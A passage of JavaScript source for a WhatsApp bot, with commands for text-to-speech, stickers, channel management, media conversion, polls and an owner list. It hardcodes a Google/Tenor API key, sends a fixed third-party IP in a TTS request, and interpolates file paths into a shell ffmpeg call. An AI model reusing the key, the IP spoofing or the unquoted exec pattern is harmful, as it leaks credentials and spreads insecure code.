        "es-MX-RenataNeural",
        "es-MX-YagoNeural",
        "es-NI-FedericoNeural",
        "es-NI-YolandaNeural",
        "es-PA-MargaritaNeural",
        "es-PA-RobertoNeural",
        "es-PE-AlexNeural",
        "es-PE-CamilaNeural",
        "es-PR-KarinaNeural",
        "es-PR-VictorNeural",
        "es-PY-MarioNeural",
        "es-PY-TaniaNeural",
        "es-SV-LorenaNeural",
        "es-SV-RodrigoNeural",
        "es-US-AlonsoNeural",
        "es-US-PalomaNeural",
        "es-UY-MateoNeural",
        "es-UY-ValentinaNeural",
        "es-VE-PaolaNeural",
        "es-VE-SebastianNeural",
        "et-EE-AnuNeural",
        "et-EE-KertNeural",
        "eu-ES-AinhoaNeural",
        "eu-ES-AnderNeural",
        "fa-IR-DilaraNeural",
        "fa-IR-FaridNeural",
        "fi-FI-HarriNeural",
        "fi-FI-NooraNeural",
        "fi-FI-SelmaNeural",
        "fil-PH-AngeloNeural",
        "fil-PH-BlessicaNeural",
        "fr-BE-CharlineNeural",
        "fr-BE-GerardNeural",
        "fr-CA-AntoineNeural",
        "fr-CA-JeanNeural",
        "fr-CA-SylvieNeural",
        "fr-CH-ArianeNeural",
        "fr-CH-FabriceNeural",
        "fr-FR-AlainNeural",
        "fr-FR-BrigitteNeural",
        "fr-FR-CelesteNeural",
        "fr-FR-ClaudeNeural",
        "fr-FR-CoralieNeural",
        "fr-FR-DeniseNeural",
        "fr-FR-EloiseNeural",
        "fr-FR-HenriNeural",
        "fr-FR-JacquelineNeural",
        "fr-FR-JeromeNeural",
        "fr-FR-JosephineNeural",
        "fr-FR-MauriceNeural",
        "fr-FR-YvesNeural",
        "fr-FR-YvetteNeural",
        "ga-IE-ColmNeural",
        "ga-IE-OrlaNeural",
        "gl-ES-RoiNeural",
        "gl-ES-SabelaNeural",
        "gu-IN-DhwaniNeural",
        "gu-IN-NiranjanNeural",
        "he-IL-AvriNeural",
        "he-IL-HilaNeural",
        "hi-IN-MadhurNeural",
        "hi-IN-SwaraNeural",
        "hr-HR-GabrijelaNeural",
        "hr-HR-SreckoNeural",
        "hu-HU-NoemiNeural",
        "hu-HU-TamasNeural",
        "hy-AM-AnahitNeural",
        "hy-AM-HaykNeural",
        "id-ID-ArdiNeural",
        "id-ID-GadisNeural",
        "is-IS-GudrunNeural",
        "is-IS-GunnarNeural",
        "it-IT-BenignoNeural",
        "it-IT-CalimeroNeural",
        "it-IT-CataldoNeural",
        "it-IT-DiegoNeural",
        "it-IT-ElsaNeural",
        "it-IT-FabiolaNeural",
        "it-IT-FiammaNeural",
        "it-IT-GianniNeural",
        "it-IT-ImeldaNeural",
        "it-IT-IrmaNeural",
        "it-IT-IsabellaNeural",
        "it-IT-LisandroNeural",
        "it-IT-PalmiraNeural",
        "it-IT-PierinaNeural",
        "it-IT-RinaldoNeural",
        "ja-JP-AoiNeural",
        "ja-JP-DaichiNeural",
        "ja-JP-KeitaNeural",
        "ja-JP-MayuNeural",
        "ja-JP-NanamiNeural",
        "ja-JP-NaokiNeural",
        "ja-JP-ShioriNeural",
        "jv-ID-DimasNeural",
        "jv-ID-SitiNeural",
        "ka-GE-EkaNeural",
        "ka-GE-GiorgiNeural",
        "kk-KZ-AigulNeural",
        "kk-KZ-DauletNeural",
        "km-KH-PisethNeural",
        "km-KH-SreymomNeural",
        "kn-IN-GaganNeural",
        "kn-IN-SapnaNeural",
        "ko-KR-BongJinNeural",
        "ko-KR-GookMinNeural",
        "ko-KR-InJoonNeural",
        "ko-KR-JiMinNeural",
        "ko-KR-SeoHyeonNeural",
        "ko-KR-SoonBokNeural",
        "ko-KR-SunHiNeural",
        "ko-KR-YuJinNeural",
        "lo-LA-ChanthavongNeural",
        "lo-LA-KeomanyNeural",
        "lt-LT-LeonasNeural",
        "lt-LT-OnaNeural",
        "lv-LV-EveritaNeural",
        "lv-LV-NilsNeural",
        "mk-MK-AleksandarNeural",
        "mk-MK-MarijaNeural",
        "ml-IN-MidhunNeural",
        "ml-IN-SobhanaNeural",
        "mn-MN-BataaNeural",
        "mn-MN-YesuiNeural",
        "mr-IN-AarohiNeural",
        "mr-IN-ManoharNeural",
        "ms-MY-OsmanNeural",
        "ms-MY-YasminNeural",
        "mt-MT-GraceNeural",
        "mt-MT-JosephNeural",
        "my-MM-NilarNeural",
        "my-MM-ThihaNeural",
        "nb-NO-FinnNeural",
        "nb-NO-IselinNeural",
        "nb-NO-PernilleNeural",
        "ne-NP-HemkalaNeural",
        "ne-NP-SagarNeural",
        "nl-BE-ArnaudNeural",
        "nl-BE-DenaNeural",
        "nl-NL-ColetteNeural",
        "nl-NL-FennaNeural",
        "nl-NL-MaartenNeural",
        "pl-PL-AgnieszkaNeural",
        "pl-PL-MarekNeural",
        "pl-PL-ZofiaNeural",
        "ps-AF-GulNawazNeural",
        "ps-AF-LatifaNeural",
        "pt-BR-AntonioNeural",
        "pt-BR-BrendaNeural",
        "pt-BR-DonatoNeural",
        "pt-BR-ElzaNeural",
        "pt-BR-FabioNeural",
        "pt-BR-FranciscaNeural",
        "pt-BR-GiovannaNeural",
        "pt-BR-HumbertoNeural",
        "pt-BR-JulioNeural",
        "pt-BR-LeilaNeural",
        "pt-BR-LeticiaNeural",
        "pt-BR-ManuelaNeural",
        "pt-BR-NicolauNeural",
        "pt-BR-ValerioNeural",
        "pt-BR-YaraNeural",
        "pt-PT-DuarteNeural",
        "pt-PT-FernandaNeural",
        "pt-PT-RaquelNeural",
        "ro-RO-AlinaNeural",
        "ro-RO-EmilNeural",
        "ru-RU-DariyaNeural",
        "ru-RU-DmitryNeural",
        "ru-RU-SvetlanaNeural",
        "si-LK-SameeraNeural",
        "si-LK-ThiliniNeural",
        "sk-SK-LukasNeural",
        "sk-SK-ViktoriaNeural",
        "sl-SI-PetraNeural",
        "sl-SI-RokNeural",
        "so-SO-MuuseNeural",
        "so-SO-UbaxNeural",
        "sq-AL-AnilaNeural",
        "sq-AL-IlirNeural",
        "sr-Latn-RS-NicholasNeural",
        "sr-Latn-RS-SophieNeural",
        "sr-RS-NicholasNeural",
        "sr-RS-SophieNeural",
        "su-ID-JajangNeural",
        "su-ID-TutiNeural",
        "sv-SE-HilleviNeural",
        "sv-SE-MattiasNeural",
        "sv-SE-SofieNeural",
        "sw-KE-RafikiNeural",
        "sw-KE-ZuriNeural",
        "sw-TZ-DaudiNeural",
        "sw-TZ-RehemaNeural",
        "ta-IN-PallaviNeural",
        "ta-IN-ValluvarNeural",
        "ta-LK-KumarNeural",
        "ta-LK-SaranyaNeural",
        "ta-MY-KaniNeural",
        "ta-MY-SuryaNeural",
        "ta-SG-AnbuNeural",
        "ta-SG-VenbaNeural",
        "te-IN-MohanNeural",
        "te-IN-ShrutiNeural",
        "th-TH-AcharaNeural",
        "th-TH-NiwatNeural",
        "th-TH-PremwadeeNeural",
        "tr-TR-AhmetNeural",
        "tr-TR-EmelNeural",
        "uk-UA-OstapNeural",
        "uk-UA-PolinaNeural",
        "ur-IN-GulNeural",
        "ur-IN-SalmanNeural",
        "ur-PK-AsadNeural",
        "ur-PK-UzmaNeural",
        "uz-UZ-MadinaNeural",
        "uz-UZ-SardorNeural",
        "vi-VN-HoaiMyNeural",
        "vi-VN-NamMinhNeural",
        "wuu-CN-XiaotongNeural",
        "wuu-CN-YunzheNeural",
        "yue-CN-XiaoMinNeural",
        "yue-CN-YunSongNeural",
        "zh-CN-XiaochenNeural",
        "zh-CN-XiaohanNeural",
        "zh-CN-XiaomengNeural",
        "zh-CN-XiaomoNeural",
        "zh-CN-XiaoqiuNeural",
        "zh-CN-XiaoruiNeural",
        "zh-CN-XiaoshuangNeural",
        "zh-CN-XiaoxiaoNeural",
        "zh-CN-XiaoxuanNeural",
        "zh-CN-XiaoyanNeural",
        "zh-CN-XiaoyiNeural",
        "zh-CN-XiaoyouNeural",
        "zh-CN-XiaozhenNeural",
        "zh-CN-YunfengNeural",
        "zh-CN-YunhaoNeural",
        "zh-CN-YunjianNeural",
        "zh-CN-YunxiNeural",
        "zh-CN-YunxiaNeural",
        "zh-CN-YunyangNeural",
        "zh-CN-YunyeNeural",
        "zh-CN-YunzeNeural",
        "zh-CN-henan-YundengNeural",
        "zh-CN-liaoning-XiaobeiNeural",
        "zh-CN-shaanxi-XiaoniNeural",
        "zh-CN-shandong-YunxiangNeural",
        "zh-CN-sichuan-YunxiNeural",
        "zh-HK-HiuGaaiNeural",
        "zh-HK-HiuMaanNeural",
        "zh-HK-WanLungNeural",
        "zh-TW-HsiaoChenNeural",
        "zh-TW-HsiaoYuNeural",
        "zh-TW-YunJheNeural",
        "zu-ZA-ThandoNeural",
        "zu-ZA-ThembaNeural"
    ]

    let lister = ListVoiceArray(ListVoice);
    let readMore = String.fromCharCode(8206).repeat(4001);

    let query = `Input query!\n\n*Example:*\n${prefix + command} *108 | My Name Is Big Daddy*\n\n` + readMore + lister.map((v, index) => "  " + (index + 1) + ". " + v).join("\n");
    
    function getParts(array, index) {
        if (isNaN(index)) {
            index = Number(index);
            if (isNaN(index)) {
                return replyphistar("Index must be a number");
            }
        }

        const text = array[index - 1];
        const language = getLanguage(text);
        return {
            short: language,
            long: text
        };
    }

    function getLanguage(text) {
        const parts = text.split("-");
        return parts.slice(0, 2).join("-");
    }
            
    async function generateVoice(Locale = "id-ID", Voice = "id-ID-ArdiNeural", Query) {
        const formData = new FormData();
        formData.append("locale", Locale);
        formData.append("content", `<voice name="${Voice}">${Query}</voice>`);
        formData.append("ip", '46.161.194.33');
        const response = await fetch('https://app.micmonster.com/restapi/create', {
            method: 'POST',
            body: formData
        });
        return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
    };
    
    let text;
    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return replyphistar(query);
    }
    
    let [atas, bawah] = text.split("|");
    if (!atas) return replyphistar(query);
    if (!bawah) return replyphistar(query);
    
    const { short, long } = getParts(ListVoice, atas);
    
    try {
        replyphistar(`Processing your request...\n` + long.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)"));

        let res = await generateVoice(short, long, bawah);
        if (res) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: res,
                mimetype: 'audio/mp4',
                ptt: true,
                waveform: [100, 0, 100, 0, 100, 0, 100]
            }, { quoted: m });
        }
    } catch (e) {
        replyphistar(`❌ Error processing your request: ${e.message}`);
    }
    break;
}
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyphistar(respond)
                if (!text) return replyphistar(respond)
                replyphistar(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await PhistarBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyphistar(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
PhistarBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
PhistarBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyphistar(`Photo/Video?`)
}
}
break

function extractChannelIdentifier(input) {
  const regex = /whatsapp\.com\/channel\/([a-zA-Z0-9._-]+)/i;
  const match = input.match(regex);
  return match ? match[1] : input;
}
// Get Newsletter Metadata
case 'getnewsletter': {
    if (!text) return replyphistar('Provide newsletter JID, invite code or channel link.');
    try {
        const id = extractChannelIdentifier(text.trim());
        let metadata;
        if (id.includes('@newsletter')) {
            metadata = await PhistarBotInc.newsletterMetadata('jid', id);
        } else {
            metadata = await PhistarBotInc.newsletterMetadata('invite', id);
        }
        replyphistar(JSON.stringify(metadata, null, 2));
    } catch (e) {
        replyphistar('Failed to get newsletter metadata:\n' + e.message);
    }
    break;
}

// Create Newsletter
case 'createchannel': {
    const [name, ...desc] = text.split('|');
    if (!name || !desc.length) return replyphistar('Use: createnewsletter Name | Description');
    try {
        const metadata = await PhistarBotInc.newsletterCreate(name.trim(), desc.join('|').trim());
        replyphistar('Newsletter created:\n' + JSON.stringify(metadata, null, 2));
    } catch (e) {
        replyphistar('Error creating newsletter:\n' + e.message);
    }
    break;
}

// Update Newsletter Description
case 'updatedesc': {
    const [jidText, ...desc] = text.split('|');
    if (!jidText || !desc.length) return replyphistar('Use: updatedesc abcd@newsletter | New Description');
    try {
        const jid = extractChannelIdentifier(jidText.trim());
        await PhistarBotInc.newsletterUpdateDescription(jid, desc.join('|').trim());
        replyphistar('Description updated.');
    } catch (e) {
        replyphistar('Failed to update description:\n' + e.message);
    }
    break;
}

// Update Newsletter Name
case 'updatename': {
    const [jidText, ...name] = text.split('|');
    if (!jidText || !name.length) return replyphistar('Use: updatename abcd@newsletter | New Name');
    try {
        const jid = extractChannelIdentifier(jidText.trim());
        await PhistarBotInc.newsletterUpdateName(jid, name.join('|').trim());
        replyphistar('Name updated.');
    } catch (e) {
        replyphistar('Failed to update name:\n' + e.message);
    }
    break;
}

// Update Newsletter Picture
case 'updatepic': {
    if (!quoted || !quoted.isImage) return replyphistar('Reply to an image to set as profile picture.');
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        const media = await quoted.download();
        await PhistarBotInc.newsletterUpdatePicture(jid, media);
        replyphistar('Profile picture updated.');
    } catch (e) {
        replyphistar('Failed to update picture:\n' + e.message);
    }
    break;
}

// Remove Newsletter Picture
case 'removepic': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterRemovePicture(jid);
        replyphistar('Profile picture removed.');
    } catch (e) {
        replyphistar('Failed to remove picture:\n' + e.message);
    }
    break;
}

// Follow Newsletter
case 'followchannel': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterFollow(jid);
        replyphistar('Followed the newsletter.');
    } catch (e) {
        replyphistar('Failed to follow:\n' + e.message);
    }
    break;
}

// Unfollow Newsletter
case 'unfollowchannel': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterUnfollow(jid);
        replyphistar('Unfollowed the newsletter.');
    } catch (e) {
        replyphistar('Failed to unfollow:\n' + e.message);
    }
    break;
}

// Delete Newsletter
case 'deletechannel': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterDelete(jid);
        replyphistar('Newsletter deleted.');
    } catch (e) {
        replyphistar('Failed to delete newsletter:\n' + e.message);
    }
    break;
}

// Mute Newsletter
case 'mutenews': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterMute(jid);
        replyphistar('Newsletter muted.');
    } catch (e) {
        replyphistar('Failed to mute:\n' + e.message);
    }
    break;
}

// Unmute Newsletter
case 'unmutenews': {
    const jid = extractChannelIdentifier(text.trim());
    if (!jid.includes('@newsletter')) return replyphistar('Provide a valid newsletter JID or channel link.');
    try {
        await PhistarBotInc.newsletterUnmute(jid);
        replyphistar('Newsletter unmuted.');
    } catch (e) {
        replyphistar('Failed to unmute:\n' + e.message);
    }
    break;
}
case 'tempadmin': {
    if (!text.includes(' ')) return replyphistar('Use the format: @user time_in_minutes');
    let [userr, time] = text.split(' ');
    if (!userr.startsWith('@')) return replyphistar('Mention a valid user.');
    if (isNaN(time)) return replyphistar('Provide time in minutes.');
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [userr + '@s.whatsapp.net'], 'promote');
    replyphistar(`@${userr} is now an admin for ${time} minutes.`);
    setTimeout(async () => {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userr + '@s.whatsapp.net'], 'demote');
        replyphistar(`@${userr} is no longer an admin.`);
    }, time * 60 * 1000);
    break;
}

case 'activity': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');

    let activeMembers = [];
    let nonActiveMembers = [];

    for (let participant of participants) {
        let contact = participant.id;
        let lastSeen;
        try {
            lastSeen = await PhistarBotInc.fetchStatus(contact); // Check last seen
        } catch (e) {
            lastSeen = null; // If last seen is unavailable, assume inactive
        }

        if (lastSeen && Date.now() - lastSeen.timestamp < 24 * 60 * 60 * 1000) {
            activeMembers.push(contact);
        } else {
            nonActiveMembers.push(contact);
        }
    }

    let activeList = activeMembers.map(member => `@${member.split('@')[0]}`).join('\n') || 'No active members in the last 24 hours.';
    let nonActiveList = nonActiveMembers.map(member => `@${member.split('@')[0]}`).join('\n') || 'All members are active in the last 24 hours.';

    replyphistar(`*Active Members in the last 24 hours:*\n${activeList}\n\n*Non-Active Members:*\n${nonActiveList}`);
    PhistarBotInc.sendMessage(m.chat, { mentions: [...activeMembers, ...nonActiveMembers] });
    break;
}

case 'poll': {
    if (!text.includes('|')) return replyphistar('Use the format: question|option1|option2|...');
    const [question, ...options] = text.split('|');
    if (options.length < 2) return replyphistar('Provide at least two options.');
    PhistarBotInc.relayMessage(m.chat, {
        pollCreationMessage: {
            name: question,
            options: options.map(o => ({ optionName: o })),
            selectableOptionsCount: options.length
        }
    });
    break;
}

case 'color': {
    if (!text.startsWith('#') || text.length !== 7) return replyphistar('Please provide a valid hex color code (e.g., #3498db).');
    PhistarBotInc.sendMessage(m.chat, { image: Buffer.from(`<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="200" height="200" fill="${text}"/></svg>`), caption: `Color preview for ${text}` });
    break;
}
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tovideo': {
    if (!quoted || !/webp/.test(mime)) {
        return replyphistar(`Reply to a video sticker with the caption *${prefix + command}*`);
    }

    // Function to convert WebP to MP4 using Ezgif
    async function convertWebpToMp4(buffer) {
        const formData = require("form-data");
        const { JSDOM } = require("jsdom");
        const { default: fetch } = require("node-fetch");

        let form = new formData();
        form.append("new-image-url", "");
        form.append("new-image", buffer, "image.webp");

        // First request to Ezgif to upload the WebP file
        let res = await fetch("https://ezgif.com/webp-to-mp4", {
            method: "POST",
            body: form,
        });
        let html = await res.text();
        let { document } = new JSDOM(html).window;

        let form2 = new formData();
        let obj = {};
        for (let input of document.querySelectorAll("form input[name]")) {
            obj[input.name] = input.value;
            form2.append(input.name, input.value);
        }

        // Second request to Ezgif to process the conversion
        let res2 = await fetch("https://ezgif.com/webp-to-mp4/" + obj.file, {
            method: "POST",
            body: form2,
        });
        let html2 = await res2.text();
        let { document: document2 } = new JSDOM(html2).window;

        // Extract the MP4 video URL
        return new URL(
            document2.querySelector("div#output > p.outfile > video > source").src,
            res2.url
        ).toString();
    }

    try {
        // Download the sticker and convert to buffer
        const mediaStream = await downloadContentFromMessage(quoted, "sticker");
        const chunks = [];
        for await (const chunk of mediaStream) {
            chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);

        // Convert WebP to MP4 using Ezgif
        const videoUrl = await convertWebpToMp4(buffer);

        // Send the MP4 video to the chat
        await PhistarBotInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: '',
            mimetype: "video/mp4",
        }, { quoted: m });
    } catch (error) {
        replyphistar(`*An error occurred while converting the video sticker to video.*\n\n*Details:* ${error.message}`);
    }
    break;
}
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Phistar.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PhistarBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyphistar(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyphistar(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                replyphistar(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyphistar(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyphistar(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await PhistarBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'addowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await PhistarBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyphistar(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'joke':
    try {
        // List of 100 jokes
        const jokes = [
            "Why don't skeletons fight each other? They don't have the guts!",
            "Why did the scarecrow win an award? Because he was outstanding in his field!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why don’t eggs tell jokes? Because they’d crack each other up!",
            "I told my computer I needed a break, and now it won't stop sending me Kit-Kats.",
            "I asked my dog what’s two minus two. He said nothing.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "I used to play piano by ear, but now I use my hands.",
            "I wondered why the baseball kept getting bigger. Then it hit me.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "Did you hear about the Italian chef that died? He pasta way. We cannoli do so much. His legacy will be a pizza history.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I used to be a baker, but I couldn't make enough dough.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What do you call fake spaghetti? An impasta!",
            "I got a job at a bakery because I kneaded dough.",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "What do you call a pile of cats? A meow-tain.",
            "How does a penguin build its house? Igloos it together.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I broke my finger last week. On the other hand, I’m okay.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "I'm no good at math, but I know that one plus one equals two... unless you're doing algebra.",
            "Why don't seagulls fly over the bay? Because then they’d be bagels.",
            "I told my computer I needed a break, and it froze.",
            "I used to be a fireman, but I got burned out.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "I have a joke about construction, but I’m still working on it.",
            "I got a reversible jacket for my birthday. I can’t wait to see how it turns out.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I used to play piano by ear, but now I use my hands.",
            "I'm reading a book about anti-gravity, it's impossible to put down.",
            "I have a fear of speed bumps, but I’m slowly getting over them.",
            "I used to play piano by ear, but now I use my hands.",
            "What do you call a pile of cats? A meow-tain.",
            "Why don't skeletons fight each other? They don’t have the guts!",
            "I used to be a baker, but I couldn't make enough dough.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I told my computer I needed a break, and it froze.",
            "I got a job at a bakery because I kneaded dough.",
            "What did one wall say to the other? I’ll meet you at the corner.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "I’m no good at math, but I know that one plus one equals two… unless you're doing algebra.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
